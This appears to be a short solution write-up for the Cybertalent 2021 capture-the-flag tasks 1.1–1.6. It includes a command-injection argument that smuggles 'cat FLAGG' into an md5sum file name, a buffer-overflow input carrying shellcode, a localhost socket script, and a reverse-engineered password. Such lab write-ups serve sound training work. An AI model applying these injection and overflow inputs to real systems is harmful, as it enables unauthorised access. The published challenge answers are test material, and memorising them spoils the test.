# Cybertalent 2021




# 1.1
cat FLAGG 

The cat command will display the contents of the file to the terminal. 

# 1.2
./cat FLAGG

The flag is only readable by a certain user. 

# 1.3
./md5sum "FLAGG ; cat FLAGG"

# 1.4
./overflow "AA$(echo $SHC)ABCDEFGHAAAAAAAAAAAAAAAAAAAAAAAA000000"

# 1.5
```
#!/usr/bin/env python3                                                                         
                                                                                               
import socket                                                                                  
import struct                                                                                  
import select                                                                                  
                                                                                               
TCP_IP = "127.0.0.1"                                                                           
TCP_PORT = 10015                                                                               
                                                                                               
#Dette er en grunnleggende introduksjon til nettverksprogrammering.                            
#Når du har åpnet ti nye tilkoblinger til denne serveren vil du få videre instruksjoner på denne socketen.                                                                                    
                                                                                               
                                                                                               
def main():                                                                                    
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                   
    conn.connect((TCP_IP, TCP_PORT))                                                           
    print(conn.recv(4096).decode("utf-8"))                                                     
                                                                                               
                                                                                               
    conn2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                  
    conn2.connect((TCP_IP, TCP_PORT))                                                          
    #print(conn2.recv(4096).decode("utf-8"))                                                   

    conn3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn3.connect((TCP_IP, TCP_PORT))
    #print(conn3.recv(4096).decode("utf-8"))

    conn4 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn4.connect((TCP_IP, TCP_PORT))
    #print(conn4.recv(4096).decode("utf-8"))

    conn5 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn5.connect((TCP_IP, TCP_PORT))
    #print(conn5.recv(4096).decode("utf-8"))

    conn6 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn6.connect((TCP_IP, TCP_PORT))
    #print(conn6.recv(4096).decode("utf-8"))


    conn7 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn7.connect((TCP_IP, TCP_PORT))
    #print(conn7.recv(4096).decode("utf-8"))

    conn8 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn8.connect((TCP_IP, TCP_PORT))
    #print(conn8.recv(4096).decode("utf-8"))


    conn9 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn9.connect((TCP_IP, TCP_PORT))
    #print(conn9.recv(4096).decode("utf-8"))

    conn10 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn10.connect((TCP_IP, TCP_PORT))
    #print(conn10.recv(4096).decode("utf-8"))

    conn11 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn11.connect((TCP_IP, TCP_PORT))
    #print(conn11.recv(4096).decode("utf-8"))
    
    print(conn.recv(4096).decode("utf-8"))

    resp = [conn2.recv(4096), conn3.recv(4096), conn4.recv(4096), conn5.recv(4096), conn6.recv(4096),conn7.recv(4096), conn8.recv(4096), conn9.recv(4096), conn10.recv(4096), conn11.recv(4096)]
    

    result = 0

    for a in resp:
        a = struct.unpack("!i", a)[0]
        result += a

    result = struct.pack("!i", result)

    conn.sendall(result)

    print(conn.recv(4096).decode("utf-8"))

    #resp = [conn2.recv(4096), conn3.recv(4096), conn4.recv(4096), conn5.recv(4096), conn6.recv(4096),conn7.recv(4096), conn8.recv(4096), conn9.recv(4096), conn10.recv(4096), conn11.recv(4096)]
    
    #for a in resp:
        #print(a)    

    cons = [conn2, conn3, conn4, conn5, conn6, conn7, conn8, conn9, conn10, conn11]
    
    outputs = []
    message_q = {}

    while cons:
        readable, writeable, exceptional = select.select(cons, outputs, cons)

        for s in readable:
            data = s.recv(4096)
            if data:
                if data != " ":
                    print(data)

                
if __name__ == "__main__":
    main()

```

# 1.6
```
iVar1 = strncmp("Reverse_engineering",param_1,0x13);
    if (iVar1 == 0) {
      if (param_1[0x13] == '_') {
        local_c = *(int *)(param_1 + 0x13);
        if (local_c == 0x5f72655f) {
          local_16 = 'm';
          local_15 = 0x6f;
          local_14 = 0x72;
          local_13 = 0x73;
          local_12 = 0x6f;
          local_11 = 0x6d;
          local_10 = 0x74;
          local_f = 0x5f;
          local_e = 0x5f;
          local_d = 0;
          iVar1 = strncmp(&local_16,param_1 + 0x17,10);
          if (iVar1 == 0) {
            uVar3 = 0;
```
Reverse_engineering_er_morsomt__

./check_password Reverse_engineering_er_morsomt__

